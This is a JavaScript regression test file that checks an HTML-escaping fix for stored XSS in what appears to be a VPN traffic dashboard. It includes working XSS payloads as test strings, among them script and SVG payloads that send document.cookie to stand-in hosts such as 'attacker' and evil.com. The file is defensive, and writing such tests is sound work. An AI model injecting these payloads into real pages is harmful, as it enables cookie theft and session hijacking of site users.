/**
 * Regression tests for stored XSS vulnerability fix
 * Simulates the actual attack vector and verifies the fix
 * Run with: node --test
 */

const { test } = require('node:test');
const assert = require('node:assert');
const { escapeHtml } = require('../static/escape.js');

test('Regression: stored XSS via root_domain field is prevented', () => {
  // Simulate the actual attack: VPN client connects with malicious destination
  const maliciousRootDomain = 'evil.io"><script>fetch(\'//attacker/steal?c=\'+document.cookie)</script>';

  // This is how the vulnerable code rendered it (WITHOUT escaping)
  const vulnerableRender = `
    <td class="px-4 py-2.5 font-medium text-zinc-100">
      ${maliciousRootDomain}
    </td>
  `;

  // The vulnerable version would contain executable script tags
  assert.strictEqual(
    vulnerableRender.includes('<script>'),
    true,
    'Vulnerable code contains unescaped script tag'
  );

  // This is how the fixed code renders it (WITH escaping)
  const safeRender = `
    <td class="px-4 py-2.5 font-medium text-zinc-100">
      ${escapeHtml(maliciousRootDomain)}
    </td>
  `;

  // The fixed version should NOT contain executable script tags
  assert.strictEqual(
    safeRender.includes('<script>'),
    false,
    'Fixed code should not contain literal script tag'
  );

  // The fixed version should contain escaped script tags
  assert.strictEqual(
    safeRender.includes('&lt;script&gt;'),
    true,
    'Fixed code should contain escaped script tag'
  );
});

test('Regression: XSS via username field in onclick attribute is prevented', () => {
  // Simulate attack via username with quote escape attempt
  const maliciousUsername = 'test\'); alert(\'XSS\'); //';

  // Old vulnerable pattern: onclick="inspectUser(123, 'username')"
  // This would allow breaking out of the string
  const vulnerableOnclick = `onclick="inspectUser(123, '${maliciousUsername}')"`;

  // Check that the vulnerable version is indeed exploitable
  assert.strictEqual(
    vulnerableOnclick.includes("'); alert('XSS');"),
    true,
    'Vulnerable onclick contains unescaped code'
  );

  // New safe pattern: data-action + data attributes (no inline JS)
  const safeDataAttr = `data-action="inspect-user" data-user-id="123" data-username="${escapeHtml(maliciousUsername)}"`;

  // The fixed version should have escaped quotes
  assert.strictEqual(
    safeDataAttr.includes("'); alert("),
    false,
    'Fixed version should not contain unescaped code'
  );

  // The fixed version should escape quotes in data attributes
  assert.strictEqual(
    safeDataAttr.includes('&#039;'),
    true,
    'Fixed version should escape quotes'
  );
});

test('Regression: XSS via dest field in live stream is prevented', () => {
  const maliciousDest = '<img src=x onerror=alert(document.domain)>';

  // Vulnerable render
  const vulnerableRender = `<td>${maliciousDest}</td>`;
  assert.strictEqual(vulnerableRender.includes('<img'), true);
  assert.strictEqual(vulnerableRender.includes('onerror='), true);

  // Safe render
  const safeRender = `<td>${escapeHtml(maliciousDest)}</td>`;
  assert.strictEqual(safeRender.includes('<img'), false, 'Should not contain literal <img');
  assert.strictEqual(safeRender.includes('&lt;img'), true, 'Should contain escaped img tag');
});

test('Regression: XSS via inbound/outbound/node fields is prevented', () => {
  const maliciousInbound = '<svg/onload=alert(1)>';
  const maliciousOutbound = '"><body onload=alert(2)>';

  // These fields are passed to formatRoutePathway and renderInvolvedNodes
  // which must escape them
  const escapedInbound = escapeHtml(maliciousInbound);
  const escapedOutbound = escapeHtml(maliciousOutbound);

  assert.strictEqual(escapedInbound.includes('<svg'), false);
  assert.strictEqual(escapedInbound.includes('onload='), false);
  assert.strictEqual(escapedOutbound.includes('onload='), false);
});

test('Regression: XSS via device/platform/userAgent fields is prevented', () => {
  const maliciousUserAgent = 'Mozilla/5.0 <script>alert(1)</script>';
  const maliciousPlatform = 'Windows<img src=x onerror=alert(2)>';
  const maliciousDeviceModel = '"><iframe src=javascript:alert(3)>';

  const escapedUA = escapeHtml(maliciousUserAgent);
  const escapedPlatform = escapeHtml(maliciousPlatform);
  const escapedDevice = escapeHtml(maliciousDeviceModel);

  // Verify none contain executable tags
  assert.strictEqual(escapedUA.includes('<script>'), false);
  assert.strictEqual(escapedPlatform.includes('<img'), false);
  assert.strictEqual(escapedDevice.includes('<iframe'), false);
});

test('Regression: complex nested payload is fully neutralized', () => {
  // Multi-vector attack combining several techniques
  const complexPayload = '"><svg/onload=fetch(`//evil.com?${btoa(document.cookie)}`)><script>alert(String.fromCharCode(88,83,83))</script>';

  const escaped = escapeHtml(complexPayload);

  // Should not contain any executable markup
  assert.strictEqual(escaped.includes('"><'), false, 'Quote-angle bracket combo should be escaped');
  assert.strictEqual(escaped.includes('<svg'), false, 'SVG tag should be escaped');
  assert.strictEqual(escaped.includes('<script>'), false, 'Script tag should be escaped');
  assert.strictEqual(escaped.includes('onload='), false, 'Event handler should be escaped');

  // Should contain only safe escaped entities
  assert.strictEqual(escaped.includes('&lt;'), true);
  assert.strictEqual(escaped.includes('&gt;'), true);
  assert.strictEqual(escaped.includes('&quot;'), true);
});

test('Regression: table rendering with malicious data produces safe HTML', () => {
  // Simulate rendering a table row with malicious domain
  const mockDomainData = {
    root_domain: 'evil.io"><script>fetch(\'//attacker/steal?c=\'+document.cookie)</script>',
    category: 'General',
    total_hits: 1337,
    users_count: 1
  };

  // Simulate the fixed rendering logic
  const safeTableRow = `
    <tr>
      <td>${escapeHtml(mockDomainData.root_domain)}</td>
      <td>${mockDomainData.category}</td>
      <td>${mockDomainData.total_hits}</td>
      <td>${mockDomainData.users_count}</td>
    </tr>
  `;

  // Verify the rendered HTML is safe
  assert.strictEqual(
    safeTableRow.match(/<script>/g),
    null,
    'Table row should contain no literal script tags'
  );

  assert.strictEqual(
    safeTableRow.includes('&lt;script&gt;'),
    true,
    'Table row should contain escaped script tags'
  );
});
